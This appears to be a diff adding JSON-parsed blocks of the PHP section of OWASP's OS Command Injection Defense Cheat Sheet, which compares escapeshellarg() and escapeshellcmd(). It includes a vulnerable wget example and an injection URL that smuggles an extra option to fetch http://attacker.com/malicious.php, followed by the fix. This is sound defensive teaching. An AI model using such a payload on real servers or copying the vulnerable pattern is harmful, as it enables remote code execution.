+    "text_content": "PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.",
+    "text_hash": "735bd414e5532f83d1ad91cd19f2228438f1e0ed05ea1e854f0ec8f00412738d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 222,
+      "end_line": 222
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00066",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 66,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.",
+    "text_hash": "972e48969cd094d23561334b31e17cd20170ee24a15564dd872bfd0d09272018",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 224,
+      "end_line": 224
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00067",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 67,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.",
+    "text_hash": "0dc0f9e9805bdd00d539ebf9cfdd3fe74b4c7a11318505a856e93da3978e9895",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 226,
+      "end_line": 226
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00068",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 68,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.",
+    "text_hash": "bf4a522f9cc4107a3f272511499d78f3227a8ba756117ce51fca9906fc2979fa",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 228,
+      "end_line": 228
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00069",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 69,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For example, consider this code using `wget` with `escapeshellcmd()`:",
+    "text_hash": "4ef80e80c1ac5f6fb588f6d9a935104bea5cf1af88f754229c57231226b16e6d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 230,
+      "end_line": 230
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00070",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 70,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . $url;\nsystem(escapeshellcmd($command));\n```",
+    "text_hash": "f956bfde300f34841f49589aa7778890e859236b33db8e066c5ee013b95bc255",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 232,
+      "end_line": 236
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": "php",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00071",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 71,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If the user provides:",
+    "text_hash": "e5b2f00ad19088903be11b1a01d5a0ee661d7af58790508734c5f23ccf1fad89",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 238,
+      "end_line": 238
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00072",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 72,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nhttp://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php\n```",
+    "text_hash": "66e35d3b9c84380483bcb2de8389e87776bf7ceb987ab010932350d7fd16771b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 240,
+      "end_line": 242
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00073",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 73,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.",
+    "text_hash": "5df6a4058f310cf148f27fdae18105959b1559c7ae1741c4a20cf13f9e735ab8",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 244,
+      "end_line": 244
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00074",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 74,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:",
+    "text_hash": "e7f230e75d72634c7b698a805c6e448d1e1661d91c2a33178b5e1aed5e50651b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 246,
+      "end_line": 246
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00075",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 75,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . escapeshellarg($url);\nsystem($command);\n```",
+    "text_hash": "409a9db7c9debfb42d4e880922fb9b7e27862849bb6005629072d9c3bb6c3d04",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 248,
+      "end_line": 252
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": "php",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00076",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 76,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Now the malicious input becomes:",
+    "text_hash": "e9d4f12266c92d6b2defc0b9a70d12528cffb37b9ea3d7d65d87b9eee4715262",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 254,
+      "end_line": 254
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00077",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 77,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nwget --directory-prefix=..\\temp '--directory-prefix=. http://attacker.com/malicious.php'\n```",
+    "text_hash": "106725346552cefb7436455f86d9ab32c104ea569523acc94a8aca0673f17863",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 256,
+      "end_line": 258
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00078",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 78,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.",
+    "text_hash": "bdc4996bc816965c8ad68800b4b0d6959947b2a78d7e5450b5fe96d9c77f0545",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 260,
+      "end_line": 260
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00079",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 79,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "In addition, it is good security practice to follow these recommendations:  ",
+    "text_hash": "f92064138089aff541e20c3c0042408d46e02c8b0c13caf76c70e91196aa5d9b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 262,
+      "end_line": 262
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00080",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 80,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- **Hardcode the command**: never allow the user to choose which executable to run.  \n- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.  \n- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.\n",
+    "text_hash": "ce64ec425eca3ecd2063ab1a29f223371caf0819eabbea85e12bd1ec0fda573b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 264,
+      "end_line": 267
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00081",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 81,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## References",
+    "text_hash": "65b72d86eeeb214ab8ca5fd24cb7cd7773e58084e95b670040df03e21e8c6fa7",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 268,
+      "end_line": 268
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "References"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00082",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 82,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- [SEI CERT C: Do not call system()](https://cmu-sei.github.io/secure-coding-standards/sei-cert-c-coding-standard/rules/environment-env/env33-c/)\n- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)",
+    "text_hash": "cf9d801ef07245af7cfa583c09a43bfeefba5c64b607967ea2c9e2d567c3ada4",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 270,
+      "end_line": 271
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "References"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  }
+]
